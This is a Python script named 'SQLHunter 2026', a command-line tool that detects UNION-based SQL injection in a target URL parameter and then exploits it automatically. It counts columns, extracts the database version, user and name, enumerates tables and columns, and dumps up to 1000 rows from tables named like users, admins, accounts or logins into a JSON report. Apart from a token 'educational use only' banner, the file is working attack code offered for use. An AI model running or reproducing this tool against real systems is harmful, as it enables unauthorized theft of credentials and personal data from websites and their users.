#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLHunter 2026 - Full Auto-Exploit Edition
Educational Purpose Only - Use on Authorized Systems
Version: 5.0 Ultimate Auto
"""

import requests
import sys
import time
import re
import random
import argparse
import json
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========== ANSI COLORS ==========
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BG_RED = '\033[41m'

# ========== BANNER ==========
BANNER = f"""
{Colors.CYAN}{Colors.BOLD}
   ███████╗ ██████╗ ██╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
   ██╔════╝██╔═══██╗██║     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████╗██║   ██║██║     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ╚════██║██║▄▄ ██║██║     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ███████║╚██████╔╝███████╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.YELLOW}{Colors.BOLD}  ⚡ SQLHunter 2026 Ultimate Auto ⚡{Colors.RESET}
{Colors.GREEN}   Automated Detection & Exploitation Tool{Colors.RESET}
{Colors.RED}{Colors.BOLD}  ⚠️  Educational Use Only!{Colors.RESET}
"""

# ========== LOGGING ==========
def log_info(msg): print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")
def log_success(msg): print(f"{Colors.GREEN}[✓]{Colors.RESET} {msg}")
def log_error(msg): print(f"{Colors.RED}[✗]{Colors.RESET} {msg}")
def log_warning(msg): print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")
def log_payload(msg): print(f"{Colors.PURPLE}[>]{Colors.RESET} {msg}")

# ========== CONFIGURATION ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]
TIMEOUT = 10
DELAY = 0.05
OUTPUT_DIR = "SQLHunter_Reports"
os.makedirs(OUTPUT_DIR, exist_ok=True)

session = requests.Session()
session.headers.update({
    "User-Agent": random.choice(USER_AGENTS),
    "Accept": "*/*",
    "Connection": "keep-alive"
})

# ========== MAIN CLASS ==========
class SQLHunter:
    def __init__(self, url, param, method="GET", data=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data
        self.orig_value = self._get_original_value()
        self.base_resp = self._send(self.orig_value)
        self.base_len = len(self.base_resp.text) if self.base_resp else 0
        self.col_count = 0
        self.visible_col = 0
        self.vulnerable = False
        self.technique = None
        self.db_info = {}

    def _get_original_value(self):
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            return params.get(self.param, ['1'])[0]
        return '1'

    def _send(self, injection):
        payload = self.orig_value + injection
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            params[self.param] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                return session.get(test_url, timeout=TIMEOUT, allow_redirects=False)
            except:
                return None
        return None

    # --- DETECTION ---
    def detect_union(self):
        log_info("Testing UNION-based SQL Injection...")
        
        # 1. Find Column Count
        for i in range(1, 50):
            pl = f" ORDER BY {i}-- -"
            resp = self._send(pl)
            if resp and (resp.status_code == 500 or len(resp.text) != self.base_len):
                self.col_count = i - 1
                break
            time.sleep(DELAY)
        
        if self.col_count == 0:
            return False
        
        log_success(f"Found {self.col_count} columns.")

        # 2. Find Visible Column
        for i in range(1, self.col_count + 1):
            nulls = ["NULL"] * self.col_count
            nulls[i - 1] = "'SQLHUNTER'"
            pl = f" UNION SELECT {','.join(nulls)}-- -"
            resp = self._send(pl)
            if resp and "SQLHUNTER" in resp.text:
                self.visible_col = i
                self.vulnerable = True
                self.technique = "UNION"
                log_success(f"Visible column found at position: {i}")
                return True
        return False

    # --- EXPLOITATION ---
    def extract_data(self, query):
        """Extract single value using UNION injection"""
        if not self.visible_col:
            return None
        
        nulls = ["NULL"] * self.col_count
        # Marker: SQLHUNTER (Hex: 53514c48554e544552)
        marker = "0x53514c48554e544552"
        nulls[self.visible_col - 1] = f"CONCAT({marker}, ({query}), {marker})"
        
        pl = f" UNION SELECT {','.join(nulls)}-- -"
        resp = self._send(pl)
        
        if resp:
            # Regex to find data between markers
            match = re.search(r'SQLHUNTER(.*?)SQLHUNTER', resp.text, re.DOTALL | re.IGNORECASE)
            if match:
                return match.group(1).strip()
        return None

    def get_db_info(self):
        """Get basic DB info"""
        log_info("Fetching Database Info...")
        queries = {
            "version": "VERSION()",
            "user": "USER()",
            "database": "DATABASE()"
        }
        for key, q in queries.items():
            val = self.extract_data(q)
            if val:
                self.db_info[key] = val
                log_success(f"{key.capitalize()}: {val}")
            time.sleep(DELAY)

    def get_databases(self):
        """Enumerate all databases"""
        log_info("Enumerating Databases...")
        dbs = []
        for i in range(50):
            q = f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {i}"
            db = self.extract_data(q)
            if db:
                dbs.append(db)
                log_success(f"DB [{i}]: {db}")
            else:
                break
            time.sleep(DELAY)
        return dbs

    def get_tables(self, database):
        """Enumerate tables in a specific database"""
        log_info(f"Enumerating Tables in '{database}'...")
        tables = []
        for i in range(100):
            q = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {i}"
            tbl = self.extract_data(q)
            if tbl:
                tables.append(tbl)
                log_success(f"Table [{i}]: {tbl}")
            else:
                break
            time.sleep(DELAY)
        return tables

    def get_columns(self, database, table):
        """Enumerate columns in a specific table"""
        log_info(f"Enumerating Columns in '{database}.{table}'...")
        cols = []
        for i in range(100):
            q = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {i}"
            col = self.extract_data(q)
            if col:
                cols.append(col)
                log_success(f"Col [{i}]: {col}")
            else:
                break
            time.sleep(DELAY)
        return cols

    def dump_table(self, database, table, columns):
        """Dump all data from a table"""
        log_info(f"Dumping Data from '{database}.{table}'...")
        if not columns:
            return
        
        # Create CONCAT string for all columns separated by '|'
        concat_cols = ",'|',".join([f"IFNULL({c},'NULL')" for c in columns])
        
        rows = []
        limit = 1000 # Max rows to dump
        for i in range(limit):
            q = f"SELECT CONCAT({concat_cols}) FROM {database}.{table} LIMIT 1 OFFSET {i}"
            row_data = self.extract_data(q)
            if row_data:
                rows.append(row_data.split('|'))
                # Print progress nicely
                sys.stdout.write(f"\r{Colors.CYAN}Dumping Row: {i+1}{Colors.RESET}")
                sys.stdout.flush()
            else:
                break
            time.sleep(DELAY)
        
        print("\n") # New line after progress
        return rows

    def auto_exploit(self):
        """Run full automatic exploitation chain"""
        if not self.vulnerable:
            log_error("Target is not vulnerable via UNION technique.")
            return

        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        log_info("STARTING AUTO-EXPLOITATION CHAIN")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

        # 1. Get Info
        self.get_db_info()
        current_db = self.db_info.get('database')
        
        if not current_db:
            log_error("Could not determine current database.")
            return

        # 2. Get Tables
        tables = self.get_tables(current_db)
        if not tables:
            log_warning("No tables found in current database.")
            return

        # 3. Dump First Few Interesting Tables (Auto Logic)
        # Usually we look for 'users', 'admin', 'accounts' etc.
        interesting_tables = [t for t in tables if any(x in t.lower() for x in ['user', 'admin', 'account', 'member', 'login'])]
        
        if not interesting_tables:
            interesting_tables = tables[:3] # Just take first 3 if no interesting ones found

        report_data = {
            "target": self.url,
            "parameter": self.param,
            "database": current_db,
            "tables_dumped": []
        }

        for tbl in interesting_tables:
            log_info(f"Processing Table: {tbl}")
            cols = self.get_columns(current_db, tbl)
            if cols:
                data = self.dump_table(current_db, tbl, cols)
                if data:
                    log_success(f"Dumped {len(data)} rows from {tbl}")
                    
                    # Save to report
                    table_report = {
                        "table_name": tbl,
                        "columns": cols,
                        "data": data
                    }
                    report_data["tables_dumped"].append(table_report)
                    
                    # Print sample data
                    print(f"\n{Colors.GREEN}Sample Data from {tbl}:{Colors.RESET}")
                    print(f"{Colors.BOLD}{' | '.join(cols)}{Colors.RESET}")
                    print("-" * 50)
                    for row in data[:5]: # Show first 5 rows
                        print(" | ".join(row))
                    print("...\n")

        # Save Final Report
        filename = f"report_{int(time.time())}.json"
        filepath = os.path.join(OUTPUT_DIR, filename)
        with open(filepath, "w") as f:
            json.dump(report_data, f, indent=2)
        log_success(f"Full Report Saved to: {filepath}")

# ========== MAIN ==========
def main():
    parser = argparse.ArgumentParser(description="SQLHunter Ultimate Auto")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", required=True, help="Parameter to test")
    parser.add_argument("--auto", action="store_true", help="Run full auto exploitation")
    
    args = parser.parse_args()

    if not args.url.startswith("http"):
        args.url = "http://" + args.url

    print(BANNER)
    
    # Disable SSL Warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    hunter = SQLHunter(args.url, args.param)
    
    # Step 1: Detect
    if hunter.detect_union():
        log_success("Vulnerability Confirmed!")
        
        # Step 2: Auto Exploit if flag is set
        if args.auto:
            hunter.auto_exploit()
        else:
            log_info("Use --auto flag to start full exploitation.")
    else:
        log_error("Target does not appear vulnerable to UNION-based SQLi.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user.{Colors.RESET}")
        sys.exit(0)
